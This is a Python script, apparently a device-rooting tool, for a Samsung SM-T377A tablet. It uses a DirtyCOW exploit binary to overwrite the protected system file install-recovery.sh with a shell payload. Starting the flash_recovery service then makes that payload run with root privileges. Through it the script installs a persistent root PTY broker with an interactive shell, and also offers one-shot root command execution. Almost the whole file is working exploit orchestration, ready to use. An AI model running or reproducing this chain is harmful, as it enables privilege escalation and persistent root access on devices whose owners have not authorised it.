#!/usr/bin/env python3
"""
Host-side client for the SM-T377A interactive root broker.

This script reuses the existing DirtyCOW + flash_recovery primitive to launch a
long-lived broker as the flash_recovery service process, then attaches to the
broker's built-in mini shell through `adb forward` and a Unix domain socket on
the device.
"""

from __future__ import annotations

import argparse
import ctypes
import os
import re
import select
import shlex
import socket
import subprocess
import sys
import tempfile
import threading
import time
from dataclasses import dataclass, field
from pathlib import Path

PAYLOAD_SIZE = 1829
DIRTYCOW = "/data/local/tmp/dirtycow_file"
TARGET = "/system/bin/install-recovery.sh"
PAYLOAD_DEV = "/data/local/tmp/payload.sh"
BROKER_DEV = "/data/local/tmp/root_pty_broker"
SOCKET_DEV = "/data/local/tmp/root_pty_broker.sock"
MINI_SHELL_DEV = "/data/local/tmp/root_mini_shell"
RUNROOT_OUTPUT_DEV = "/data/local/tmp/root_runroot.out"
RUNROOT_STATUS_DEV = "/data/local/tmp/root_runroot.status"
DEFAULT_PORT = 61337
DEFAULT_SHELL = MINI_SHELL_DEV
DETACH_BYTE = b"\x1d"  # Ctrl-]
PROMPT_RE = re.compile(r"root@SM-T377A:(?P<cwd>[^\r\n#]+)# ")


@dataclass
class InputAction:
    kind: str
    payload: str | None = None


@dataclass
class InteractiveSessionState:
    cwd: str = "/"
    prompt_tail: str = ""
    lock: threading.Lock = field(default_factory=threading.Lock)

    def observe_output(self, text: str) -> None:
        with self.lock:
            combined = (self.prompt_tail + text)[-2048:]
            for match in PROMPT_RE.finditer(combined):
                self.cwd = match.group("cwd")
            self.prompt_tail = combined[-2048:]

    def get_cwd(self) -> str:
        with self.lock:
            return self.cwd


class ShellError(RuntimeError):
    pass


def run_command(args: list[str], *, check: bool = True, text: bool = True, timeout: float = 30.0) -> subprocess.CompletedProcess:
    result = subprocess.run(args, capture_output=True, text=text, timeout=timeout, check=False)
    if check and result.returncode != 0:
        stderr = result.stderr.strip()
        stdout = result.stdout.strip()
        message = stderr or stdout or f"command failed: {' '.join(args)}"
        raise ShellError(message)
    return result


def adb(*args: str, check: bool = True, timeout: float = 30.0) -> subprocess.CompletedProcess:
    return run_command(["adb", *args], check=check, timeout=timeout)


def adb_stdout(*args: str, timeout: float = 30.0) -> str:
    return adb(*args, timeout=timeout).stdout.strip()


def adb_raw(*args: str, check: bool = True, timeout: float = 30.0) -> str:
    return adb(*args, check=check, timeout=timeout).stdout


def adb_shell(command: str, *, check: bool = True, timeout: float = 30.0) -> str:
    if check:
        return adb_stdout("shell", command, timeout=timeout)
    return adb("shell", command, check=False, timeout=timeout).stdout.strip()


def adb_shell_raw(command: str, *, check: bool = True, timeout: float = 30.0) -> str:
    return adb_raw("shell", command, check=check, timeout=timeout)


def require_device() -> None:
    state = adb("get-state", check=False, timeout=10.0)
    if state.returncode != 0 or state.stdout.strip() != "device":
        raise ShellError("adb device not available")


def print_status_line(label: str, value: str) -> None:
    print(f"{label:<24} {value}")


def write_stdout(data: bytes) -> None:
    buffer = getattr(sys.stdout, "buffer", None)
    if buffer is not None:
        buffer.write(data)
        buffer.flush()
        return
    sys.stdout.write(data.decode("utf-8", errors="replace"))
    sys.stdout.flush()


def device_path_exists(path: str) -> bool:
    probe = adb_shell(f"if [ -e {path} ]; then echo yes; else echo no; fi", check=False, timeout=15.0)
    return probe.strip().splitlines()[-1:] == ["yes"]


def get_service_state() -> str:
    state = adb_shell("getprop init.svc.flash_recovery", check=False, timeout=10.0).strip()
    return state or "unknown"


def wait_for_service_state(expected: str, timeout: float) -> bool:
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        if get_service_state() == expected:
            return True
        time.sleep(0.25)
    return False


def remove_forward(port: int) -> None:
    adb("forward", "--remove", f"tcp:{port}", check=False, timeout=10.0)


def install_forward(port: int) -> None:
    remove_forward(port)
    adb("forward", f"tcp:{port}", f"localfilesystem:{SOCKET_DEV}", timeout=10.0)


def connect_broker(port: int, op: bytes, timeout: float = 3.0, *, keep_timeout: bool = True) -> socket.socket:
    install_forward(port)
    conn = socket.create_connection(("127.0.0.1", port), timeout=timeout)
    conn.sendall(op)
    if not keep_timeout:
        conn.settimeout(None)
    return conn


def ping_broker(port: int, quiet: bool = False) -> bool:
    try:
        conn = connect_broker(port, b"P")
        with conn:
            data = conn.recv(32)
        return data == b"PONG\n"
    except Exception as exc:  # noqa: BLE001
        if not quiet:
            print(f"[-] Broker ping failed: {exc}")
        return False


def wait_for_ping(port: int, timeout: float) -> bool:
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        if ping_broker(port, quiet=True):
            return True
        time.sleep(0.25)
    return False


def broker_payload(shell_path: str) -> str:
    script = (
        "#!/system/bin/sh\n"
        f"exec {BROKER_DEV} --socket {SOCKET_DEV} --shell {shell_path}\n"
    )
    if len(script) > PAYLOAD_SIZE:
        raise ShellError(f"broker payload exceeds {PAYLOAD_SIZE} bytes")
    return script.ljust(PAYLOAD_SIZE)


def oneshot_payload(command: str, cwd: str) -> str:
    quoted_cwd = shlex.quote(cwd or "/")
    script = (
        "#!/system/bin/sh\n"
        f"rm -f {RUNROOT_OUTPUT_DEV} {RUNROOT_STATUS_DEV}\n"
        "{\n"
        f"cd {quoted_cwd} || exit 111\n"
        f"{command}\n"
        f"}} > {RUNROOT_OUTPUT_DEV} 2>&1\n"
        "status=$?\n"
        f"echo $status > {RUNROOT_STATUS_DEV}\n"
        f"chmod 666 {RUNROOT_OUTPUT_DEV} {RUNROOT_STATUS_DEV}\n"
    )
    if len(script) > PAYLOAD_SIZE:
        raise ShellError(f"one-shot payload exceeds {PAYLOAD_SIZE} bytes")
    return script.ljust(PAYLOAD_SIZE)


def resolve_binary(explicit: str | None, default_name: str, friendly_name: str) -> Path:
    candidates: list[Path] = []
    if explicit:
        candidates.append(Path(explicit))
    script_dir = Path(__file__).resolve().parent
    candidates.append(script_dir / default_name)
    candidates.append(Path.cwd() / default_name)

    for candidate in candidates:
        if candidate.exists():
            return candidate

    pretty = "\n".join(f"  - {path}" for path in candidates)
    raise ShellError(
        f"{friendly_name} not found. Build it first, then rerun.\n"
        f"Checked:\n{pretty}"
    )


def resolve_broker_binary(explicit: str | None) -> Path:
    return resolve_binary(explicit, "root_pty_broker", "broker binary")


def resolve_shell_binary() -> Path:
    return resolve_binary(None, "root_mini_shell", "mini shell binary")


def push_file(host_path: Path, device_path: str, mode: int) -> None:
    adb("push", str(host_path), device_path, timeout=60.0)
    adb_shell(f"chmod {mode:o} {device_path}", timeout=15.0)


def push_text_payload(payload_text: str) -> None:
    temp_payload = Path(tempfile.gettempdir()) / "root_pty_payload.sh"
    temp_payload.write_text(payload_text, encoding="ascii", newline="\n")
    try:
        push_file(temp_payload, PAYLOAD_DEV, 0o644)
    finally:
        temp_payload.unlink(missing_ok=True)


def install_broker(host_binary: Path, shell_binary: Path, shell_path: str) -> None:
    require_device()
    if get_service_state() == "running":
        adb_shell("setprop ctl.stop flash_recovery", check=False, timeout=10.0)
        wait_for_service_state("stopped", 5.0)

    print(f"[*] Pushing broker: {host_binary}")
    push_file(host_binary, BROKER_DEV, 0o755)

    print(f"[*] Pushing mini shell: {shell_binary}")
    push_file(shell_binary, MINI_SHELL_DEV, 0o755)

    push_text_payload(broker_payload(shell_path))

    print("[*] Overwriting install-recovery.sh with DirtyCOW payload")
    result = adb("shell", f"{DIRTYCOW} {TARGET} {PAYLOAD_DEV}", timeout=60.0)
    stdout = result.stdout.strip()
    if stdout:
        print(stdout)


def ensure_broker_running(
    port: int,
    broker_path: str | None,
    shell_path: str,
    *,
    reinstall: bool = False,
    restart: bool = False,
) -> None:
    require_device()

    if ping_broker(port, quiet=True) and not restart and not reinstall:
        return

    state = get_service_state()
    if restart or state == "running":
        print("[*] Stopping existing flash_recovery service")
        adb_shell("setprop ctl.stop flash_recovery", check=False, timeout=10.0)
        wait_for_service_state("stopped", 5.0)

    if not reinstall:
        print("[*] Trying to start existing broker payload")
        adb_shell("setprop ctl.start flash_recovery", check=False, timeout=10.0)
        if wait_for_ping(port, 4.0):
            return

    broker_binary = resolve_broker_binary(broker_path)
    shell_binary = resolve_shell_binary()
    install_broker(broker_binary, shell_binary, shell_path)
    print("[*] Starting broker via flash_recovery")
    adb_shell(f"rm -f {SOCKET_DEV}", check=False, timeout=10.0)
    adb_shell("setprop ctl.start flash_recovery", check=False, timeout=10.0)
    if not wait_for_ping(port, 8.0):
        raise ShellError("broker did not come up after install/start")


def run_oneshot_command(command: str, cwd: str, timeout: float = 30.0) -> tuple[str, int | None]:
    require_device()
    if get_service_state() == "running":
        adb_shell("setprop ctl.stop flash_recovery", check=False, timeout=10.0)
        wait_for_service_state("stopped", 5.0)
    adb_shell(f"rm -f {RUNROOT_OUTPUT_DEV} {RUNROOT_STATUS_DEV}", check=False, timeout=10.0)
    push_text_payload(oneshot_payload(command, cwd))

    print("[*] Overwriting install-recovery.sh with one-shot payload")
    result = adb("shell", f"{DIRTYCOW} {TARGET} {PAYLOAD_DEV}", timeout=60.0)
    stdout = result.stdout.strip()
    if stdout:
        print(stdout)

    print(f"[*] Running one-shot root command from {cwd}: {command}")
    adb_shell("setprop ctl.start flash_recovery", check=False, timeout=10.0)

    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        if device_path_exists(RUNROOT_STATUS_DEV):
            break
        if get_service_state() == "stopped":
            break
        time.sleep(0.25)

    if not device_path_exists(RUNROOT_STATUS_DEV):
        raise ShellError("one-shot root command did not finish before timeout")

    output = adb_shell_raw(
        f"if [ -f {RUNROOT_OUTPUT_DEV} ]; then cat {RUNROOT_OUTPUT_DEV}; fi",
        check=False,
        timeout=30.0,
    )
    status_text = adb_shell(
        f"if [ -f {RUNROOT_STATUS_DEV} ]; then cat {RUNROOT_STATUS_DEV}; fi",
        check=False,
        timeout=15.0,
    ).strip()
    status = int(status_text) if status_text.isdigit() else None
    adb_shell(f"rm -f {RUNROOT_OUTPUT_DEV} {RUNROOT_STATUS_DEV}", check=False, timeout=10.0)
    return output, status


class WindowsConsoleRaw:
    ENABLE_PROCESSED_INPUT = 0x0001
    ENABLE_LINE_INPUT = 0x0002
    ENABLE_ECHO_INPUT = 0x0004
    ENABLE_QUICK_EDIT_MODE = 0x0040
    ENABLE_EXTENDED_FLAGS = 0x0080

    def __enter__(self) -> "WindowsConsoleRaw":
        kernel32 = ctypes.windll.kernel32
        self._handle = kernel32.GetStdHandle(-10)
        self._original_mode = ctypes.c_uint()
        if not kernel32.GetConsoleMode(self._handle, ctypes.byref(self._original_mode)):
            raise ShellError("failed to read Windows console mode")
        new_mode = self._original_mode.value
        new_mode |= self.ENABLE_EXTENDED_FLAGS
        new_mode &= ~self.ENABLE_QUICK_EDIT_MODE
        new_mode &= ~(self.ENABLE_PROCESSED_INPUT | self.ENABLE_LINE_INPUT | self.ENABLE_ECHO_INPUT)
        if not kernel32.SetConsoleMode(self._handle, new_mode):
            raise ShellError("failed to switch Windows console to raw mode")
        return self

    def __exit__(self, exc_type, exc, tb) -> None:
        ctypes.windll.kernel32.SetConsoleMode(self._handle, self._original_mode.value)


def windows_key_bytes() -> tuple[bytes, bool]:
    import msvcrt

    special_map = {
        "H": b"\x1b[A",
        "P": b"\x1b[B",
        "K": b"\x1b[D",
        "M": b"\x1b[C",
        "G": b"\x1b[H",
        "O": b"\x1b[F",
        "S": b"\x1b[3~",
        "R": b"\x1b[2~",
        "I": b"\x1b[5~",
        "Q": b"\x1b[6~",
    }

    ch = msvcrt.getwch()
    if ch == "\x1d":
        return b"", True
    if ch in ("\x00", "\xe0"):
        return special_map.get(msvcrt.getwch(), b""), False
    if ch == "\r":
        return b"\n", False
    if ch == "\x08":
        return b"\x7f", False
    if ch == "\x03":
        return b"\x03", False
    return ch.encode("utf-8", errors="ignore"), False


def maybe_parse_local_command(line: str) -> InputAction | None:
    parts = line.strip().split(None, 1)
    if len(parts) == 2 and parts[0] in {"runroot", "oneshot"}:
        return InputAction("runroot", parts[1])
    return None


def update_line_buffer(line_buffer: list[str], data: bytes) -> None:
    if data in {b"\x7f", b"\x08"}:
        if line_buffer:
            line_buffer.pop()
        return
    if data in {b"\x03", b"\x1b"} or data.startswith(b"\x1b"):
        return
    try:
        text = data.decode("utf-8", errors="ignore")
    except UnicodeDecodeError:
        text = ""
    for ch in text:
        if ch >= " ":
            line_buffer.append(ch)


def restore_shell_cwd(conn: socket.socket, cwd: str) -> None:
    if not cwd or cwd == "/":
        return
    conn.sendall(f"cd {shlex.quote(cwd)}\n".encode("utf-8"))


def send_input_windows(conn: socket.socket, stop_event: threading.Event) -> InputAction:
    import msvcrt
    line_buffer: list[str] = []

    with WindowsConsoleRaw():
        while not stop_event.is_set():
            if not msvcrt.kbhit():
                time.sleep(0.01)
                continue
            data, detach = windows_key_bytes()
            if detach:
                return InputAction("detach")
            if not data:
                continue
            if data == b"\n":
                line = "".join(line_buffer)
                line_buffer.clear()
                local_command = maybe_parse_local_command(line)
                if local_command is not None:
                    print()
                    return local_command
                conn.sendall(data)
                continue
            if data == b"\x03":
                line_buffer.clear()
            else:
                update_line_buffer(line_buffer, data)
            if data:
                conn.sendall(data)
    return InputAction("closed")


def send_input_posix(conn: socket.socket, stop_event: threading.Event) -> InputAction:
    import termios
    import tty

    fd = sys.stdin.fileno()
    old_attrs = termios.tcgetattr(fd)
    line_buffer: list[str] = []
    try:
        tty.setraw(fd)
        while not stop_event.is_set():
            ready, _, _ = select.select([fd], [], [], 0.1)
            if not ready:
                continue
            data = os.read(fd, 1)
            if not data:
                return InputAction("closed")
            if data == DETACH_BYTE:
                return InputAction("detach")
            if data == b"\n":
                line = "".join(line_buffer)
                line_buffer.clear()
                local_command = maybe_parse_local_command(line)
                if local_command is not None:
                    print()
                    return local_command
                conn.sendall(data)
                continue
            if data == b"\x03":
                line_buffer.clear()
            else:
                update_line_buffer(line_buffer, data)
            conn.sendall(data)
    finally:
        termios.tcsetattr(fd, termios.TCSADRAIN, old_attrs)
    return InputAction("closed")


def reader_loop(conn: socket.socket, stop_event: threading.Event, session_state: InteractiveSessionState) -> None:
    try:
        while not stop_event.is_set():
            try:
                data = conn.recv(4096)
            except socket.timeout:
                continue
            if not data:
                break
            session_state.observe_output(data.decode("utf-8", errors="replace"))
            write_stdout(data)
    except OSError:
        pass
    finally:
        stop_event.set()


def execute_runroot_roundtrip(
    port: int,
    broker_path: str | None,
    shell_path: str,
    session_state: InteractiveSessionState,
    command: str,
) -> None:
    cwd = session_state.get_cwd() or "/"
    print(f"[*] runroot: pausing broker and executing from {cwd}")
    stop_broker(port)
    output, status = run_oneshot_command(command, cwd)
    print("[*] runroot output:")
    if output:
        write_stdout(output.encode("utf-8", errors="replace"))
        if not output.endswith("\n"):
            print()
    else:
        print("(no output)")
    if status is None:
        print("[*] runroot exit code: unknown")
    else:
        print(f"[*] runroot exit code: {status}")
    ensure_broker_running(port, broker_path, shell_path, reinstall=True, restart=True)


def attach_shell(port: int, broker_path: str | None, shell_path: str) -> None:
    session_state = InteractiveSessionState()
    print("[+] Local command: runroot <cmd> (or oneshot <cmd>) executes via one-shot root and reconnects.")

    while True:
        conn = connect_broker(port, b"S", timeout=5.0, keep_timeout=False)
        stop_event = threading.Event()
        reader = threading.Thread(target=reader_loop, args=(conn, stop_event, session_state), daemon=True)
        reader.start()
        restore_shell_cwd(conn, session_state.get_cwd())

        print("[+] Connected. Press Ctrl-] to detach.")
        action = InputAction("closed")
        try:
            if os.name == "nt":
                action = send_input_windows(conn, stop_event)
            else:
                action = send_input_posix(conn, stop_event)
        except KeyboardInterrupt:
            try:
                conn.sendall(b"\x03")
            except OSError:
                pass
            action = InputAction("closed")
        except OSError:
            action = InputAction("closed")
        finally:
            stop_event.set()
            try:
                conn.shutdown(socket.SHUT_RDWR)
            except OSError:
                pass
            conn.close()
            reader.join(timeout=1.0)

        if action.kind == "runroot" and action.payload:
            execute_runroot_roundtrip(port, broker_path, shell_path, session_state, action.payload)
            continue

        print("\n[*] Detached.")
        return


def stop_broker(port: int) -> None:
    require_device()
    ack = ""
    try:
        conn = connect_broker(port, b"X")
        with conn:
            ack = conn.recv(32).decode("utf-8", errors="replace").strip()
    except Exception:
        ack = ""

    if ack:
        print(f"[*] Broker replied: {ack}")

    if get_service_state() != "stopped":
        adb_shell("setprop ctl.stop flash_recovery", check=False, timeout=10.0)
        wait_for_service_state("stopped", 5.0)

    adb_shell(f"rm -f {SOCKET_DEV}", check=False, timeout=10.0)
    remove_forward(port)
    print(f"[*] flash_recovery state: {get_service_state()}")


def command_status(port: int) -> None:
    require_device()
    print_status_line("flash_recovery state", get_service_state())
    print_status_line("SELinux", adb_shell("getenforce", check=False, timeout=10.0) or "unknown")
    print_status_line("broker binary", "present" if device_path_exists(BROKER_DEV) else "missing")
    print_status_line("socket file", "present" if device_path_exists(SOCKET_DEV) else "missing")
    print_status_line("broker ping", "reachable" if ping_broker(port, quiet=True) else "unreachable")


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(description="Interactive root shell client for SM-T377A")

    subparsers = parser.add_subparsers(dest="command", required=True)

    install_parser = subparsers.add_parser("install", help="Push broker, push payload, and DirtyCOW install-recovery.sh")
    install_parser.add_argument("--broker", help="Host path to root_pty_broker; defaults to the binary next to this script")
    install_parser.add_argument(
        "--shell-path",
        default=DEFAULT_SHELL,
        help=f"Device path for the broker child binary (default: {DEFAULT_SHELL})",
    )

    status_parser = subparsers.add_parser("status", help="Show broker and flash_recovery status")
    status_parser.add_argument("--port", type=int, default=DEFAULT_PORT, help=f"Local TCP port for adb forward (default: {DEFAULT_PORT})")

    shell_parser = subparsers.add_parser("shell", help="Ensure broker is running and attach an interactive shell")
    shell_parser.add_argument("--broker", help="Host path to root_pty_broker; defaults to the binary next to this script")
    shell_parser.add_argument("--port", type=int, default=DEFAULT_PORT, help=f"Local TCP port for adb forward (default: {DEFAULT_PORT})")
    shell_parser.add_argument("--reinstall", action="store_true", help="Force reinstall before starting")
    shell_parser.add_argument("--restart", action="store_true", help="Stop flash_recovery before starting")
    shell_parser.add_argument(
        "--shell-path",
        default=DEFAULT_SHELL,
        help=f"Device path for the broker child binary (default: {DEFAULT_SHELL})",
    )

    runroot_parser = subparsers.add_parser("runroot", help="Run a one-shot root command through flash_recovery")
    runroot_parser.add_argument("--file", help="a local file to read the command from, instead of the command line")
    runroot_parser.add_argument("runroot_command", nargs=argparse.REMAINDER, help="Command to execute as one-shot root")
    runroot_parser.add_argument("--cwd", default="/", help="Working directory for the one-shot command (default: /)")
    runroot_parser.add_argument("--timeout", type=float, default=30.0, help="Seconds to wait for the one-shot command")

    stop_parser = subparsers.add_parser("stop", help="Ask the broker to exit and stop flash_recovery")
    stop_parser.add_argument("--port", type=int, default=DEFAULT_PORT, help=f"Local TCP port for adb forward (default: {DEFAULT_PORT})")
    return parser


def main() -> int:
    parser = build_parser()
    args = parser.parse_args()

    try:
        if args.command == "status":
            command_status(args.port)
        elif args.command == "install":
            install_broker(resolve_broker_binary(args.broker), resolve_shell_binary(), args.shell_path)
        elif args.command == "shell":
            reinstall = args.reinstall or args.shell_path != DEFAULT_SHELL
            if args.shell_path != DEFAULT_SHELL and not args.reinstall:
                print(f"[*] Forcing reinstall for custom child path: {args.shell_path}")
            ensure_broker_running(
                args.port,
                args.broker,
                args.shell_path,
                reinstall=reinstall,
                restart=args.restart,
            )
            attach_shell(args.port, args.broker, args.shell_path)
        elif args.command == "runroot":
            if args.file:
                path = args.file
                if not os.path.isfile(path):
                    parser.error(f"file not found: {path}")
                with open(path, "r", encoding="utf-8") as f:
                    command = f.read()
            else:
                command = " ".join(args.runroot_command)
            if not command:
                parser.error("runroot requires a command to execute")
            output, status = run_oneshot_command(command, args.cwd, timeout=args.timeout)
            if output:
                sys.stdout.write(output)
                if not output.endswith("\n"):
                    print()
            print(f"[*] exit code: {status if status is not None else 'unknown'}")
        elif args.command == "stop":
            stop_broker(args.port)
        else:
            parser.error("unknown command")
    except (ShellError, subprocess.TimeoutExpired) as exc:
        print(f"[!] {exc}", file=sys.stderr)
        return 1

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
